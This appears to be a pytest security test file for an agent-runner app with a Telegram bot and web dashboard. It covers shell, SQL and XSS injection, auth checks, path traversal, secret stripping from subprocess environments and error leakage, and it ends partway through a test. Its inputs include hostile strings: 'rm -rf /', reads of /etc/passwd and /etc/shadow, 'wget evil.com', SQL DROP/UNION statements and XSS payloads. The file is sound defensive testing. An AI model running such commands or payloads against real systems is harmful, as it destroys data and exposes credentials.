"""QA Security Deep-Dive Sessions 1-5: attack-surface validation tests.

QA 1: Input Validation & Injection         (25 tests)
QA 2: Authentication & Authorization        (20 tests)
QA 3: Path Traversal & File System          (22 tests)
QA 4: Process & Environment Security        (20 tests)
QA 5: Data Exposure & Error Handling        (20 tests)
"""

from __future__ import annotations

import html
import json
import os
from datetime import datetime, timedelta, timezone
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
import pytest_asyncio
from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker, create_async_engine

from app.config.settings import settings
from app.core.models import Base, ChainStatus, Task, TaskChain, TaskStatus, _utcnow
from app.web.dashboard import _esc, _render_dashboard, _task_to_dict, _chain_to_dict, create_dashboard_app

import app.core.broker as broker_mod

import httpx


# ── Shared fixtures ─────────────────────────────────────────────────


@pytest_asyncio.fixture
async def fresh_db(monkeypatch):
    engine = create_async_engine("sqlite+aiosqlite://", echo=False)
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    factory = async_sessionmaker(engine, class_=AsyncSession, expire_on_commit=False)

    async def _patched():
        return factory()

    monkeypatch.setattr(broker_mod, "get_session", _patched)
    yield engine
    await engine.dispose()


@pytest_asyncio.fixture
async def dashboard_client(fresh_db, monkeypatch):
    monkeypatch.setattr("app.config.settings.settings.dashboard_token", "sec-tok-42")
    app = create_dashboard_app()
    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as c:
        yield c


def _auth(token="sec-tok-42"):
    return {"Authorization": f"Bearer {token}"}


def _make_task(**overrides) -> Task:
    defaults = {
        "id": 1,
        "prompt": "test",
        "project_dir": "/tmp/p",
        "agent": "opencode",
        "status": TaskStatus.PENDING,
        "exit_code": None,
        "error_message": None,
        "output_summary": None,
        "duration_seconds": None,
        "created_at": _utcnow(),
        "started_at": None,
        "completed_at": None,
        "chain_id": None,
        "chain_step": None,
        "repeat_total": None,
        "repeat_remaining": None,
        "telegram_chat_id": None,
        "telegram_msg_id": None,
    }
    defaults.update(overrides)
    return Task(**defaults)


def _make_chain(**overrides) -> TaskChain:
    defaults = {
        "id": 1,
        "name": "test-chain",
        "steps_json": json.dumps([{"prompt": "a"}]),
        "current_step": 0,
        "status": ChainStatus.IDLE,
        "created_at": _utcnow(),
        "started_at": None,
        "completed_at": None,
        "telegram_chat_id": None,
    }
    defaults.update(overrides)
    return TaskChain(**defaults)


# ═══════════════════════════════════════════════════════════════════
# QA 1: INPUT VALIDATION & INJECTION
# ═══════════════════════════════════════════════════════════════════


class TestQA1ShellInjectionInBuildCommand:
    """Verify _build_command treats the entire prompt as a single argument."""

    def _build(self, prompt, agent="opencode", template=None):
        from app.core.runner import AgentRunner

        runner = AgentRunner()
        task = _make_task(prompt=prompt, agent=agent, project_dir="/tmp/p")
        if template:
            with patch.object(settings, "agent_commands", {agent: template}):
                return runner._build_command(task)
        return runner._build_command(task)

    def test_semicolon_stays_single_arg(self):
        argv = self._build("hello; rm -rf /", template="echo {prompt}")
        # The prompt must be ONE argv element, not split by semicolon
        assert any("hello; rm -rf /" in a for a in argv)
        assert "rm" not in [a.strip() for a in argv]

    def test_backtick_subshell_stays_single_arg(self):
        argv = self._build("`cat /etc/passwd`", template="echo {prompt}")
        assert any("`cat /etc/passwd`" in a for a in argv)

    def test_dollar_expansion_stays_single_arg(self):
        argv = self._build("$(whoami)", template="echo {prompt}")
        assert any("$(whoami)" in a for a in argv)

    def test_pipe_stays_single_arg(self):
        argv = self._build("hello | cat /etc/shadow", template="echo {prompt}")
        joined = " ".join(argv)
        # pipe should be inside the prompt argument, not a separate token
        assert "| cat" not in argv

    def test_ampersand_backgrounding_stays_single_arg(self):
        argv = self._build("task & wget evil.com", template="echo {prompt}")
        assert any("task & wget evil.com" in a for a in argv)

    def test_newline_injection_stays_single_arg(self):
        argv = self._build("line1\nmalicious_cmd", template="echo {prompt}")
        assert any("line1\nmalicious_cmd" in a for a in argv)

    def test_single_quotes_in_prompt(self):
        argv = self._build("it's a test", template="echo {prompt}")
        assert any("it's a test" in a for a in argv)

    def test_double_quotes_in_prompt(self):
        argv = self._build('say "hello world"', template="echo {prompt}")
        assert any('say "hello world"' in a for a in argv)

    def test_glob_wildcard_in_prompt(self):
        argv = self._build("delete *.py", template="echo {prompt}")
        assert any("delete *.py" in a for a in argv)


class TestQA1SQLInjectionViaORM:
    """Verify prompts with SQL metacharacters pass through ORM safely."""

    @pytest.mark.asyncio
    async def test_sql_injection_in_prompt(self, fresh_db):
        payload = "'; DROP TABLE tasks; --"
        task = await broker_mod.enqueue_task(prompt=payload)
        fetched = await broker_mod.get_task_by_id(task.id)
        assert fetched is not None
        assert fetched.prompt == payload

    @pytest.mark.asyncio
    async def test_sql_injection_in_chain_name(self, fresh_db):
        payload = "test'; DELETE FROM task_chains; --"
        chain = await broker_mod.save_chain(
            name=payload[:64], steps=[{"prompt": "step1"}]
        )
        fetched = await broker_mod.get_chain_by_id(chain.id)
        assert fetched is not None
        assert fetched.name == payload[:64]

    @pytest.mark.asyncio
    async def test_union_select_in_prompt(self, fresh_db):
        payload = "UNION SELECT * FROM sqlite_master --"
        task = await broker_mod.enqueue_task(prompt=payload)
        fetched = await broker_mod.get_task_by_id(task.id)
        assert fetched.prompt == payload


class TestQA1XSSPayloadsStoredSafely:
    """Verify XSS payloads are stored raw but escaped on display."""

    @pytest.mark.asyncio
    async def test_script_tag_stored_and_escaped(self, fresh_db):
        payload = '<script>alert("xss")</script>'
        task = await broker_mod.enqueue_task(prompt=payload)
        d = _task_to_dict(task)
        # Stored raw in DB
        assert task.prompt == payload
        # _task_to_dict truncates prompt to 200 chars, but doesn't escape
        # The dashboard _esc function handles escaping
        escaped = _esc(d["prompt"])
        assert "<script>" not in escaped
        assert "&lt;script&gt;" in escaped

    @pytest.mark.asyncio
    async def test_img_onerror_xss(self, fresh_db):
        payload = '<img src=x onerror=alert(1)>'
        task = await broker_mod.enqueue_task(prompt=payload)
        escaped = _esc(task.prompt)
        assert "onerror" not in escaped or "&" in escaped

    def test_esc_svg_onload(self):
        payload = '<svg onload=alert(1)>'
        assert "<svg" not in _esc(payload)

    def test_esc_event_handler_injection(self):
        payload = '" onmouseover="alert(1)" x="'
        result = _esc(payload)
        assert "onmouseover" not in result or "&#" in result or "&quot;" in result


class TestQA1UnicodeEdgeCases:
    """Verify unicode edge cases don't bypass validation."""

    @pytest.mark.asyncio
    async def test_zero_width_chars_in_prompt(self, fresh_db):
        payload = "normal\u200b\u200c\u200dtext"  # zero-width space, non-joiner, joiner
        task = await broker_mod.enqueue_task(prompt=payload)
        assert task.prompt == payload

    @pytest.mark.asyncio
    async def test_rtl_override_in_prompt(self, fresh_db):
        payload = "run \u202efdp\u202c command"  # RTL override
        task = await broker_mod.enqueue_task(prompt=payload)
        assert task.prompt == payload

    @pytest.mark.asyncio
    async def test_homoglyph_attack_stored_literally(self, fresh_db):
        # Cyrillic 'а' (U+0430) looks like Latin 'a'
        payload = "delete \u0430ll files"
        task = await broker_mod.enqueue_task(prompt=payload)
        assert task.prompt == payload

    @pytest.mark.asyncio
    async def test_null_in_chain_step_prompt(self, fresh_db):
        """Null bytes in chain step prompts are stored through ORM without issue."""
        # The bot _sanitize_text strips nulls, but direct broker call stores as-is
        steps = [{"prompt": "step with \x00 null"}]
        chain = await broker_mod.save_chain(name="null-test", steps=steps)
        assert chain.steps[0]["prompt"] == "step with \x00 null"

    @pytest.mark.asyncio
    async def test_boundary_prompt_length_2000(self, fresh_db):
        """Exactly MAX_PROMPT_LEN should be accepted by broker (bot enforces)."""
        prompt = "x" * 2000
        task = await broker_mod.enqueue_task(prompt=prompt)
        assert len(task.prompt) == 2000

    @pytest.mark.asyncio
    async def test_chain_step_prompt_exactly_2000(self, fresh_db):
        steps = [{"prompt": "y" * 2000}]
        chain = await broker_mod.save_chain(name="boundary-2k", steps=steps)
        assert len(chain.steps[0]["prompt"]) == 2000

    @pytest.mark.asyncio
    async def test_chain_step_prompt_2001_rejected(self, fresh_db):
        steps = [{"prompt": "y" * 2001}]
        with pytest.raises(ValueError, match="exceeds 2000"):
            await broker_mod.save_chain(name="over-2k", steps=steps)


# ═══════════════════════════════════════════════════════════════════
# QA 2: AUTHENTICATION & AUTHORIZATION
# ═══════════════════════════════════════════════════════════════════


class TestQA2DashboardAuthEmptyToken:
    """Verify behavior when dashboard_token is empty (open access)."""

    @pytest.mark.asyncio
    async def test_empty_token_allows_unauthenticated(self, fresh_db, monkeypatch):
        monkeypatch.setattr("app.config.settings.settings.dashboard_token", "")
        app = create_dashboard_app()
        transport = httpx.ASGITransport(app=app)
        async with httpx.AsyncClient(transport=transport, base_url="http://test") as c:
            r = await c.get("/api/health")
            assert r.status_code == 200

    @pytest.mark.asyncio
    async def test_empty_token_still_returns_security_headers(self, fresh_db, monkeypatch):
        monkeypatch.setattr("app.config.settings.settings.dashboard_token", "")
        app = create_dashboard_app()
        transport = httpx.ASGITransport(app=app)
        async with httpx.AsyncClient(transport=transport, base_url="http://test") as c:
            r = await c.get("/api/health")
            assert r.headers["x-frame-options"] == "DENY"
            assert r.headers["x-content-type-options"] == "nosniff"


class TestQA2DashboardAuthWrongTokens:
    """Verify authentication rejects various invalid tokens."""

    @pytest.mark.asyncio
    async def test_no_header_rejected(self, dashboard_client):
        r = await dashboard_client.get("/api/stats")
        assert r.status_code == 401

    @pytest.mark.asyncio
    async def test_empty_bearer_rejected(self, dashboard_client):
        r = await dashboard_client.get("/api/stats", headers={"Authorization": "Bearer "})
        assert r.status_code == 401

    @pytest.mark.asyncio
    async def test_wrong_scheme_rejected(self, dashboard_client):
        r = await dashboard_client.get("/api/stats", headers={"Authorization": "Basic sec-tok-42"})
        assert r.status_code == 401

    @pytest.mark.asyncio
    async def test_partial_token_rejected(self, dashboard_client):
        r = await dashboard_client.get("/api/stats", headers=_auth("sec-tok-4"))
        assert r.status_code == 401

    @pytest.mark.asyncio
    async def test_token_with_trailing_space_on_header_tolerated(self, dashboard_client):
        """Middleware strips the full header; trailing space on token part is handled."""
        r = await dashboard_client.get("/api/stats", headers=_auth("sec-tok-42 "))
        # After .strip() on "Bearer sec-tok-42 " → "Bearer sec-tok-42" → matches
        assert r.status_code == 200

    @pytest.mark.asyncio
    async def test_token_with_interior_space_rejected(self, dashboard_client):
        r = await dashboard_client.get("/api/stats", headers=_auth("sec- tok-42"))
        assert r.status_code == 401

    @pytest.mark.asyncio
    async def test_correct_token_passes(self, dashboard_client):
        r = await dashboard_client.get("/api/health", headers=_auth())
        assert r.status_code == 200

    @pytest.mark.asyncio
    async def test_token_case_sensitive(self, dashboard_client):
        r = await dashboard_client.get("/api/stats", headers=_auth("SEC-TOK-42"))
        assert r.status_code == 401

    @pytest.mark.asyncio
    async def test_bearer_keyword_case_matters(self, dashboard_client):
        """'bearer' (lowercase) should fail because hmac.compare_digest is exact."""
        r = await dashboard_client.get(
            "/api/stats", headers={"Authorization": "bearer sec-tok-42"}
        )
        assert r.status_code == 401


class TestQA2DashboardHTTPMethods:
    """Verify dashboard rejects unsupported HTTP methods."""

    @pytest.mark.asyncio
    async def test_post_to_health_returns_405(self, dashboard_client):
        r = await dashboard_client.post("/api/health", headers=_auth())
        assert r.status_code == 405

    @pytest.mark.asyncio
    async def test_put_to_stats_returns_405(self, dashboard_client):
        r = await dashboard_client.put("/api/stats", headers=_auth())
        assert r.status_code == 405

    @pytest.mark.asyncio
    async def test_delete_to_tasks_returns_405(self, dashboard_client):
        r = await dashboard_client.delete("/api/tasks", headers=_auth())
        assert r.status_code == 405

    @pytest.mark.asyncio
    async def test_patch_to_chains_returns_405(self, dashboard_client):
        r = await dashboard_client.patch("/api/chains", headers=_auth())
        assert r.status_code == 405


class TestQA2TelegramAuthEdgeCases:
    """Verify auth_required handles edge-case user IDs."""

    def _make_update(self, user_id):
        update = MagicMock()
        if user_id is None:
            update.effective_user = None
        else:
            update.effective_user = MagicMock()
            update.effective_user.id = user_id
        return update

    @pytest.mark.asyncio
    async def test_none_user_rejected(self, monkeypatch):
        from app.telegram.bot import auth_required

        called = False

        @auth_required
        async def handler(update, context):
            nonlocal called
            called = True

        update = self._make_update(None)
        await handler(update, MagicMock())
        assert not called

    @pytest.mark.asyncio
    async def test_zero_user_id_rejected(self, monkeypatch):
        from app.telegram.bot import auth_required

        monkeypatch.setattr(settings, "allowed_user_ids", [12345])

        called = False

        @auth_required
        async def handler(update, context):
            nonlocal called
            called = True

        update = self._make_update(0)
        await handler(update, MagicMock())
        assert not called

    @pytest.mark.asyncio
    async def test_negative_user_id_rejected(self, monkeypatch):
        from app.telegram.bot import auth_required

        monkeypatch.setattr(settings, "allowed_user_ids", [12345])

        called = False

        @auth_required
        async def handler(update, context):
            nonlocal called
            called = True

        update = self._make_update(-1)
        await handler(update, MagicMock())
        assert not called

    @pytest.mark.asyncio
    async def test_allowed_user_id_passes(self, monkeypatch):
        from app.telegram.bot import auth_required

        monkeypatch.setattr(settings, "allowed_user_ids", [12345])

        called = False

        @auth_required
        async def handler(update, context):
            nonlocal called
            called = True

        update = self._make_update(12345)
        await handler(update, MagicMock())
        assert called

    @pytest.mark.asyncio
    async def test_large_user_id_not_in_list_rejected(self, monkeypatch):
        from app.telegram.bot import auth_required

        monkeypatch.setattr(settings, "allowed_user_ids", [12345])

        called = False

        @auth_required
        async def handler(update, context):
            nonlocal called
            called = True

        update = self._make_update(999999999999)
        await handler(update, MagicMock())
        assert not called


# ═══════════════════════════════════════════════════════════════════
# QA 3: PATH TRAVERSAL & FILE SYSTEM
# ═══════════════════════════════════════════════════════════════════


class TestQA3PathTraversalRunner:
    """Verify _is_allowed_dir blocks traversal attempts."""

    def _check(self, path, allowed=None):
        from app.core.runner import AgentRunner

        if allowed is None:
            allowed = ["/tmp/safe"]
        with patch.object(settings, "allowed_project_dirs", allowed):
            real = os.path.realpath(os.path.expanduser(path))
            return AgentRunner._is_allowed_dir(real)

    def test_dotdot_traversal_blocked(self):
        assert self._check("/tmp/safe/../../../etc/passwd") is False

    def test_double_dotdot_blocked(self):
        assert self._check("/tmp/safe/../../etc") is False

    def test_absolute_escape_blocked(self):
        assert self._check("/etc/shadow") is False

    def test_home_tilde_not_in_allowed(self):
        assert self._check("~", allowed=["/tmp/safe"]) is False

    def test_trailing_slash_still_matches(self):
        assert self._check("/tmp/safe/", allowed=["/tmp/safe"]) is True

    def test_subdir_allowed(self):
        assert self._check("/tmp/safe/project/sub", allowed=["/tmp/safe"]) is True

    def test_prefix_collision_blocked(self):
        """'/tmp/safexyz' must NOT match '/tmp/safe'."""
        assert self._check("/tmp/safexyz") is False

    def test_exact_match_allowed(self):
        assert self._check("/tmp/safe") is True

    def test_empty_allowed_list_blocks_all(self):
        assert self._check("/tmp/safe", allowed=[]) is False

    def test_dot_path_resolves(self):
        """'.' resolves to cwd which is unlikely to be in allowed_project_dirs=['/tmp/safe']."""
        assert self._check(".") is False


class TestQA3PathTraversalBot:
    """Verify _is_allowed_project_dir in bot module."""

    def test_dotdot_in_path(self, monkeypatch):
        from app.telegram.bot import _is_allowed_project_dir

        monkeypatch.setattr(settings, "allowed_project_dirs", ["/tmp/safe"])
        assert _is_allowed_project_dir("/tmp/safe/../../../etc") is False

    def test_allowed_subdir(self, monkeypatch):
        from app.telegram.bot import _is_allowed_project_dir

        monkeypatch.setattr(settings, "allowed_project_dirs", ["/tmp/safe"])
        assert _is_allowed_project_dir("/tmp/safe/myproject") is True

    def test_prefix_collision(self, monkeypatch):
        from app.telegram.bot import _is_allowed_project_dir

        monkeypatch.setattr(settings, "allowed_project_dirs", ["/tmp/safe"])
        assert _is_allowed_project_dir("/tmp/safevil") is False


class TestQA3SymlinkResolution:
    """Verify symlinks are resolved before checking allowed_project_dirs."""

    def test_symlink_inside_allowed_resolves(self, tmp_path, monkeypatch):
        from app.core.runner import AgentRunner

        real_dir = tmp_path / "real"
        real_dir.mkdir()
        link = tmp_path / "link"
        link.symlink_to(real_dir)

        monkeypatch.setattr(settings, "allowed_project_dirs", [str(tmp_path)])
        assert AgentRunner._is_allowed_dir(os.path.realpath(str(link))) is True

    def test_symlink_escaping_allowed_blocked(self, tmp_path, monkeypatch):
        from app.core.runner import AgentRunner

        outside = tmp_path / "outside"
        outside.mkdir()
        safe = tmp_path / "safe"
        safe.mkdir()
        link = safe / "escape"
        link.symlink_to(outside)

        monkeypatch.setattr(settings, "allowed_project_dirs", [str(safe)])
        # The symlink resolves to 'outside' which is not under 'safe'
        assert AgentRunner._is_allowed_dir(os.path.realpath(str(link))) is False

    def test_nested_symlink_chain(self, tmp_path, monkeypatch):
        from app.core.runner import AgentRunner

        target = tmp_path / "target"
        target.mkdir()
        link1 = tmp_path / "link1"
        link1.symlink_to(target)
        link2 = tmp_path / "link2"
        link2.symlink_to(link1)

        monkeypatch.setattr(settings, "allowed_project_dirs", [str(tmp_path)])
        assert AgentRunner._is_allowed_dir(os.path.realpath(str(link2))) is True


class TestQA3PathWithSpecialChars:
    """Paths with spaces, unicode, and special characters."""

    def test_space_in_path(self, tmp_path, monkeypatch):
        from app.core.runner import AgentRunner

        spaced = tmp_path / "my project"
        spaced.mkdir()
        monkeypatch.setattr(settings, "allowed_project_dirs", [str(tmp_path)])
        assert AgentRunner._is_allowed_dir(os.path.realpath(str(spaced))) is True

    def test_unicode_in_path(self, tmp_path, monkeypatch):
        from app.core.runner import AgentRunner

        uni = tmp_path / "проект"
        uni.mkdir()
        monkeypatch.setattr(settings, "allowed_project_dirs", [str(tmp_path)])
        assert AgentRunner._is_allowed_dir(os.path.realpath(str(uni))) is True

    def test_hyphen_and_dot_in_path(self, tmp_path, monkeypatch):
        from app.core.runner import AgentRunner

        dotpath = tmp_path / "my.project-v2"
        dotpath.mkdir()
        monkeypatch.setattr(settings, "allowed_project_dirs", [str(tmp_path)])
        assert AgentRunner._is_allowed_dir(os.path.realpath(str(dotpath))) is True

    def test_very_long_path(self, monkeypatch):
        from app.core.runner import AgentRunner

        long_path = "/tmp/safe/" + "a" * 500
        monkeypatch.setattr(settings, "allowed_project_dirs", ["/tmp/safe"])
        # Path doesn't exist, but _is_allowed_dir checks string prefix
        assert AgentRunner._is_allowed_dir(long_path) is True

    @pytest.mark.asyncio
    async def test_execute_nonexistent_dir_fails_task(self, monkeypatch):
        """_execute should fail the task if project_dir doesn't exist on disk."""
        from app.core.runner import AgentRunner

        monkeypatch.setattr(settings, "allowed_project_dirs", ["/nonexistent"])
        monkeypatch.setattr(settings, "agent_commands", {"opencode": "echo {prompt}"})

        captured = {}

        async def fake_complete(task_id, exit_code, output_summary, full_output, error_message=None):
            captured["exit_code"] = exit_code
            captured["error_message"] = error_message
            return _make_task(id=task_id, status=TaskStatus.FAILED)

        import app.core.runner as runner_mod

        monkeypatch.setattr(runner_mod, "complete_task", fake_complete)

        runner = AgentRunner()
        task = _make_task(project_dir="/nonexistent/path")
        await runner._execute(task)
        assert captured["exit_code"] == -1
        assert "not found" in captured["error_message"] or "not exist" in captured["error_message"]


# ═══════════════════════════════════════════════════════════════════
# QA 4: PROCESS & ENVIRONMENT SECURITY
# ═══════════════════════════════════════════════════════════════════


class TestQA4SafeEnvComprehensive:
    """Comprehensive _safe_env testing beyond the basics in test_security_session21."""

    def test_dashboard_token_stripped(self, monkeypatch):
        from app.core.runner import AgentRunner

        # DASHBOARD_TOKEN doesn't start with sensitive prefixes — ensure it's safe
        # Actually it doesn't match any prefix, so it would NOT be stripped
        # This test documents that DASHBOARD_TOKEN is not in the env by default
        # (Pydantic envvar, not exported to subprocess)
        monkeypatch.delenv("DASHBOARD_TOKEN", raising=False)
        env = AgentRunner._safe_env()
        assert "DASHBOARD_TOKEN" not in env

    def test_secret_management_key_stripped(self, monkeypatch):
        from app.core.runner import AgentRunner

        monkeypatch.setenv("SECRET_MANAGEMENT_KEY", "vault-key")
        env = AgentRunner._safe_env()
        assert "SECRET_MANAGEMENT_KEY" not in env

    def test_multiple_sensitive_vars_all_stripped(self, monkeypatch):
        from app.core.runner import AgentRunner

        monkeypatch.setenv("TELEGRAM_BOT_TOKEN", "tgtoken")
        monkeypatch.setenv("SLACK_WEBHOOK_URL", "https://slack")
        monkeypatch.setenv("API_KEY_GITHUB", "gh-key")
        monkeypatch.setenv("SECRET_JWT_KEY", "jwtkey")
        monkeypatch.setenv("BOT_TOKEN_ALT", "alttoken")

        env = AgentRunner._safe_env()
        for key in ["TELEGRAM_BOT_TOKEN", "SLACK_WEBHOOK_URL", "API_KEY_GITHUB",
                     "SECRET_JWT_KEY", "BOT_TOKEN_ALT"]:
            assert key not in env

    def test_safe_vars_preserved_alongside_sensitive(self, monkeypatch):
        from app.core.runner import AgentRunner

        monkeypatch.setenv("TELEGRAM_BOT_TOKEN", "secret")
        monkeypatch.setenv("PATH", "/usr/bin")
        monkeypatch.setenv("HOME", "/home/user")
        monkeypatch.setenv("LANG", "en_US.UTF-8")

        env = AgentRunner._safe_env()
        assert "PATH" in env
        assert "HOME" in env
        assert "LANG" in env

    def test_empty_value_sensitive_still_stripped(self, monkeypatch):
        from app.core.runner import AgentRunner

        monkeypatch.setenv("TELEGRAM_EMPTY", "")
        env = AgentRunner._safe_env()
        assert "TELEGRAM_EMPTY" not in env

    def test_similar_but_non_matching_prefix_kept(self, monkeypatch):
        from app.core.runner import AgentRunner

        monkeypatch.setenv("TELEGRAPHY_SETTING", "not-a-secret")
        env = AgentRunner._safe_env()
        # "TELEGRAPHY_SETTING" starts with "TELEGRAM_"? No, it starts with "TELEGRAPHY"
        # Actually "TELEGRAM_" prefix check: "TELEGRAPHY_SETTING".upper().startswith("TELEGRAM_") is True
        # Wait: "TELEGRAPHY_SETTING" starts with "TELEGRAM_"? T-E-L-E-G-R-A-P-H-Y vs T-E-L-E-G-R-A-M-_
        # No: TELEGRAPHY != TELEGRAM_ -- 'P' vs 'M'
        assert "TELEGRAPHY_SETTING" in env


class TestQA4BuildCommandEdgeCases:
    """Verify _build_command with tricky templates and prompts."""

    def test_prompt_with_braces(self):
        from app.core.runner import AgentRunner

        runner = AgentRunner()
        task = _make_task(prompt="test {injection} attempt", agent="opencode")
        with patch.object(settings, "agent_commands", {"opencode": "echo {prompt}"}):
            argv = runner._build_command(task)
        assert any("test {injection} attempt" in a for a in argv)

    def test_project_dir_with_spaces(self):
        from app.core.runner import AgentRunner

        runner = AgentRunner()
        task = _make_task(
            prompt="hello", agent="opencode",
            project_dir="/home/user/my project dir"
        )
        with patch.object(
            settings, "agent_commands", {"opencode": "cmd --dir {project_dir} -p {prompt}"}
        ):
            argv = runner._build_command(task)
        # project_dir should be a single argv element
        assert "/home/user/my project dir" in argv

    def test_unknown_agent_returns_echo(self):
        from app.core.runner import AgentRunner

        runner = AgentRunner()
        task = _make_task(prompt="test", agent="nonexistent")
        argv = runner._build_command(task)
        assert argv[0] == "echo"
        assert "Unknown agent" in argv[1]

    def test_template_without_placeholders(self):
        from app.core.runner import AgentRunner

        runner = AgentRunner()
        task = _make_task(prompt="ignored", agent="plain")
        with patch.object(settings, "agent_commands", {"plain": "ls -la"}):
            argv = runner._build_command(task)
        assert argv == ["ls", "-la"]

    def test_prompt_with_sentinel_chars(self):
        """Prompt containing null byte sentinels doesn't break tokenization."""
        from app.core.runner import AgentRunner

        runner = AgentRunner()
        task = _make_task(prompt="test\x00PROMPT\x00value", agent="opencode")
        with patch.object(settings, "agent_commands", {"opencode": "echo {prompt}"}):
            argv = runner._build_command(task)
        # Should contain the raw prompt in an argument
        assert any("test" in a for a in argv)


class TestQA4SummarizeEdgeCases:
    """Verify _summarize truncation and error extraction."""

    def test_empty_output(self):
        from app.core.runner import AgentRunner

        runner = AgentRunner()
        result = runner._summarize("", exit_code=0)
        assert result == "(no output)"

    def test_output_truncated_to_max(self, monkeypatch):
        from app.core.runner import AgentRunner

        monkeypatch.setattr(settings, "output_summary_max_chars", 50)
        runner = AgentRunner()
        output = "x" * 200
        result = runner._summarize(output, exit_code=0)
        assert len(result) <= 50

    def test_error_lines_extracted_on_failure(self):
        from app.core.runner import AgentRunner

        runner = AgentRunner()
        output = "line1\nERROR: something broke\nline3\nTraceback (most recent call last):\nFailed"
        result = runner._summarize(output, exit_code=1)
        assert "ERROR" in result or "Traceback" in result or "Failed" in result

    def test_no_error_lines_uses_tail(self):
        from app.core.runner import AgentRunner

        runner = AgentRunner()
        output = "line1\nline2\nline3\nall good\ndone"
        result = runner._summarize(output, exit_code=1)
        # No error keywords, so should use tail
        assert "done" in result

    def test_whitespace_only_output(self):
        from app.core.runner import AgentRunner

        runner = AgentRunner()
        result = runner._summarize("   \n\n  \n", exit_code=0)
        assert result == "(no output)"


class TestQA4ProcessTimeout:
    """Verify the runner handles process timeouts."""

    @pytest.mark.asyncio
    async def test_timeout_produces_timeout_message(self, monkeypatch, tmp_path):
        from app.core.runner import AgentRunner

        monkeypatch.setattr(settings, "task_timeout_seconds", 1)
        monkeypatch.setattr(settings, "allowed_project_dirs", [str(tmp_path)])
        monkeypatch.setattr(
            settings, "agent_commands",
            {"opencode": "python3 -c 'import time; time.sleep(30)'"},
        )

        captured = {}

        async def fake_complete(task_id, exit_code, output_summary, full_output, error_message=None):
            captured["full_output"] = full_output
            captured["error_message"] = error_message
            return _make_task(id=task_id, status=TaskStatus.FAILED)

        import app.core.runner as runner_mod

        monkeypatch.setattr(runner_mod, "complete_task", fake_complete)

        runner = AgentRunner()
        task = _make_task(project_dir=str(tmp_path))
        await runner._execute(task)

        assert "TIMEOUT" in captured["full_output"]


# ═══════════════════════════════════════════════════════════════════
# QA 5: DATA EXPOSURE & ERROR HANDLING
# ═══════════════════════════════════════════════════════════════════


class TestQA5ErrorResponsesNoLeakage:
    """Verify error responses don't leak internal details."""

    @pytest.mark.asyncio
    async def test_500_no_stack_trace(self, dashboard_client, monkeypatch):
        async def boom(*a, **kw):
            raise RuntimeError("internal DB connection string: postgresql://user:pass@host/db")

        monkeypatch.setattr("app.web.dashboard.get_recent_tasks", boom)
        r = await dashboard_client.get("/api/tasks", headers=_auth())
        assert r.status_code == 500
        body = r.json()
        assert "Internal error" in body["detail"]
        assert "postgresql" not in body["detail"]
        assert "pass" not in body["detail"]

    @pytest.mark.asyncio
    async def test_stats_error_generic_message(self, dashboard_client, monkeypatch):
        async def boom():
            raise Exception("secret internal detail: /home/user/.env")

        monkeypatch.setattr("app.web.dashboard.get_running_task", boom)
        r = await dashboard_client.get("/api/stats", headers=_auth())
        assert r.status_code == 500
        body = r.json()
        assert ".env" not in body["detail"]

    @pytest.mark.asyncio
    async def test_queue_error_generic(self, dashboard_client, monkeypatch):
        async def boom():
            raise Exception("disk full at /var/data")

        monkeypatch.setattr("app.web.dashboard.get_pending_tasks", boom)
        r = await dashboard_client.get("/api/queue", headers=_auth())
        assert r.status_code == 500
        body = r.json()
        assert "/var/data" not in body["detail"]

    @pytest.mark.asyncio
    async def test_chains_error_generic(self, dashboard_client, monkeypatch):
        async def boom():
            raise ValueError("broken internal state at chain_id=42")

        monkeypatch.setattr("app.web.dashboard.list_chains", boom)
        r = await dashboard_client.get("/api/chains", headers=_auth())
        assert r.status_code == 500
        body = r.json()
        assert "chain_id=42" not in body["detail"]

    @pytest.mark.asyncio
    async def test_chain_detail_error_generic(self, dashboard_client, monkeypatch):
        async def boom(chain_id):
            raise Exception("SQL error near table task_chains")

        monkeypatch.setattr("app.web.dashboard.get_chain_by_id", boom)
        r = await dashboard_client.get("/api/chains/1", headers=_auth())
        assert r.status_code == 500
        body = r.json()
        assert "task_chains" not in body["detail"]

    @pytest.mark.asyncio
    async def test_task_detail_error_generic(self, dashboard_client, monkeypatch):
        async def boom(task_id):
            raise Exception("file not found: /home/user/secrets.json")

        monkeypatch.setattr("app.web.dashboard.get_task_by_id", boom)
        r = await dashboard_client.get("/api/tasks/1", headers=_auth())
        assert r.status_code == 500
        body = r.json()
        assert "secrets.json" not in body["detail"]


class TestQA5TaskOutputTruncation:
    """Verify prompt truncation in API responses."""

    def test_prompt_truncated_to_200(self):
        task = _make_task(prompt="A" * 500)
        d = _task_to_dict(task)
        assert len(d["prompt"]) == 200

    def test_prompt_exactly_200_not_truncated(self):
        task = _make_task(prompt="B" * 200)
        d = _task_to_dict(task)
        assert len(d["prompt"]) == 200

    def test_short_prompt_preserved(self):
        task = _make_task(prompt="hello")
        d = _task_to_dict(task)
        assert d["prompt"] == "hello"

    def test_none_prompt_becomes_empty(self):
        task = _make_task(prompt=None)
        # Prompt column is not nullable but _task_to_dict handles None
        d = _task_to_dict(task)
        assert d["prompt"] == ""


class TestQA5ChainStepsJsonMalformed:
    """Verify chain steps_json handles malformed data."""

    def test_invalid_json_returns_empty_list(self):
        chain = _make_chain(steps_json="not json at all")
        assert chain.steps == []

    def test_empty_string_returns_empty(self):
        chain = _make_chain(steps_json="")
        assert chain.steps == []

    def test_null_json_returns_none(self):
        chain = _make_chain(steps_json="null")
        # json.loads("null") returns None; steps property returns it without exception
        # callers should guard against None from malformed steps_json
        assert chain.steps is None

    def test_valid_json_array(self):
        chain = _make_chain(steps_json='[{"prompt":"test"}]')
        assert chain.steps == [{"prompt": "test"}]

    def test_json_with_extra_keys(self):
        chain = _make_chain(steps_json='[{"prompt":"a","extra":"b"}]')
        assert chain.steps[0]["prompt"] == "a"
        assert chain.steps[0]["extra"] == "b"


class TestQA5DashboardResponseContentTypes:
    """Verify API returns proper content types."""

    @pytest.mark.asyncio
    async def test_json_endpoints_return_json(self, dashboard_client):
        for path in ["/api/health", "/api/tasks", "/api/queue", "/api/chains"]:
            r = await dashboard_client.get(path, headers=_auth())
            assert "application/json" in r.headers.get("content-type", ""), f"Failed for {path}"

    @pytest.mark.asyncio
    async def test_html_endpoint_returns_html(self, dashboard_client):
        r = await dashboard_client.get("/", headers=_auth())
